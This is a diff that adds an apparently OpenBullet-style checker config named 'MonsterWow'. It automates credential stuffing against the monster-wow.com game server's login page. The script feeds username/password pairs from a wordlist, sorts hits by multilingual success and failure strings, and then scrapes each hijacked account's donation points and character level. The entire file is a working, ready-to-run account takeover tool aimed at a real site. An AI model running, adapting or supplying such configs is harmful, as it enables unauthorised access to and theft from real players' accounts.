@@ -1,0 +1,63 @@
+[SETTINGS]
+{
+  "Name": "MonsterWow",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-30T23:07:42.2532495+00:00",
+  "AdditionalInfo": "",
+  "Author": "Doberman",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST REQUEST POST "https://monster-wow.com/quest.php?name=login" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&action=Login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Rossz jelszó vagy felhasználó!" 
+    KEY "Neispravan korisnicko ime ili lozinka!" 
+    KEY "Nieprawidłowe hasło lub nazwa użytkownika!" 
+    KEY "Nesprávné uživatelské jméno nebo heslo!" 
+    KEY "Cuenta O Contraseña Incorrectos" 
+    KEY "(!)" 
+    KEY "Incorrect username or password!" 
+  KEYCHAIN Success OR 
+    KEY "" 
+    KEY "» Logout" 
+    KEY "> --> Vote for us and get additional Points!<" 
+    KEY "" 
+    KEY "Odjavi se" 
+    KEY "Kilépés" 
+    KEY "Donation Points:" 
+    KEY "You are now logged in!" 
+#GET_Donation REQUEST GET "http://monster-wow.com/quest.php?name=marketplace" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Donation_capture PARSE "<SOURCE>" LR "name=\"donatepoint\" value=\"" "\"" Recursive=FALSE -> CAP "Donation" "" "" 
+REQUEST GET "https://monster-wow.com/quest.php?name=char" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "Level:" "<" Recursive=TRUE -> CAP "Level:" "" "" 
